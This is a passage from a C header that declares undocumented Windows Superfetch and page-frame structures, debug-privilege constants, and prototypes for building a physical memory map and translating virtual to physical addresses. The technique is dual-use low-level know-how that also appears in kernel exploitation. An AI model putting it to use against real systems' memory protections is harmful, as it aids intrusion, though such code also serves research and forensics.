        PAGEDIR_INFORMATION        e3;
        UNIQUE_PROCESS_INFORMATION e4;
    } u1;
    SIZE_T PageFrameIndex;
    union {
        struct {
            ULONG Image : 1;
            ULONG Mismatch : 1;
        } e1;
        PVOID FileObject;
        PVOID UniqueFileObjectKey;
        PVOID ProtoPteAddress;
        PVOID VirtualAddress;
    } u2;
} MMPFN_IDENTITY;

typedef struct SYSTEM_MEMORY_LIST_INFORMATION {
    SIZE_T ZeroPageCount;
    SIZE_T FreePageCount;
    SIZE_T ModifiedPageCount;
    SIZE_T ModifiedNoWritePageCount;
    SIZE_T BadPageCount;
    SIZE_T PageCountByPriority[8];
    SIZE_T RepurposedPagesByPriority[8];
    ULONG_PTR ModifiedPageCountPageFile;
} SYSTEM_MEMORY_LIST_INFORMATION;

typedef struct PF_PFN_PRIO_REQUEST {
    ULONG Version;
    ULONG RequestFlags;
    SIZE_T PfnCount;
    SYSTEM_MEMORY_LIST_INFORMATION MemInfo;
    MMPFN_IDENTITY PageData[ANYSIZE_ARRAY];
} PF_PFN_PRIO_REQUEST;

typedef struct PF_PHYSICAL_MEMORY_RANGE {
    ULONG_PTR BasePfn;
    ULONG_PTR PageCount;
} PF_PHYSICAL_MEMORY_RANGE;

// always set the Version field to 1 or 2 before use
typedef struct PF_MEMORY_RANGE_INFO_V1 {
    ULONG Version;
    ULONG RangeCount;
    PF_PHYSICAL_MEMORY_RANGE Ranges[ANYSIZE_ARRAY];
} PF_MEMORY_RANGE_INFO_V1;

typedef struct PF_MEMORY_RANGE_INFO_V2 {
    ULONG Version;
    ULONG Flags;
    ULONG RangeCount;
    PF_PHYSICAL_MEMORY_RANGE Ranges[ANYSIZE_ARRAY];
} PF_MEMORY_RANGE_INFO_V2;

#define SE_PROF_SINGLE_PROCESS_PRIVILEGE 13
#define SE_DEBUG_PRIVILEGE 20

#define SystemSuperfetchInformation (SYSTEM_INFORMATION_CLASS)79

NTSYSAPI NTSTATUS RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
NTSTATUS BuildMemoryMap();
ULONGLONG vtop(ULONGLONG address);
void FreeMemoryMaps();
```